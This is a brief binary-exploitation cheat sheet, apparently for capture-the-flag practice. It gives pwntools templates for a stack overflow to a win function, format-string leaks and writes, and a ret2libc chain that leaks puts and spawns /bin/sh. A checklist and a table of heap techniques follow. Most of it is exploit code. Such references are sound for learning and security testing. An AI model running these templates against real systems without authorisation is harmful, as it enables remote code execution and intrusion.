# Pwn — Attack Patterns

## Buffer Overflow (No Canary, No PIE)

```python
from pwn import *

p = process('./binary')
# p = remote('host', port)  # For remote target

payload = b'A' * offset + p64(win_function)
p.sendline(payload)
p.interactive()
```

## Format String

```python
from pwn import *

# Leak stack values
payload = b'%p ' * 20

# Leak specific offset
payload = b'%7$p'  # Leak 7th stack value

# Write to address
payload = fmtstr_payload(offset, {target: value})
```

## ret2libc

```python
from pwn import *

# Step 1: Leak libc address (via puts/printf GOT)
elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Leak puts@GOT
rop.puts(elf.got['puts'])
rop.main()

p = process('./binary')
p.sendline(b'A' * offset + rop.chain())
leaked = u64(p.recvline()[:6].ljust(8, b'\x00'))

# Step 2: Calculate libc base
libc.address = leaked - libc.symbols['puts']

# Step 3: Call system("/bin/sh")
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh')))
p.sendline(b'A' * offset + rop2.chain())
p.interactive()
```

## Exploitation Checklist

1. Run binary, understand behavior
2. Check protections with `checksec`
3. Find vulnerability (overflow, format string, UAF)
4. Find offset to control (cyclic pattern)
5. Build exploit (shellcode, ROP, or ret2libc)
6. Test locally, then remote

## Heap Exploitation Patterns

| Technique | Applicable When |
|-----------|----------------|
| Use-After-Free | Dangling pointer after free |
| Double Free | Can free same chunk twice |
| Heap Overflow | Can overflow into adjacent chunk |
| Tcache poisoning | glibc 2.26+, corrupt tcache fd pointer |
| Fastbin dup | Duplicate entry in fastbin |
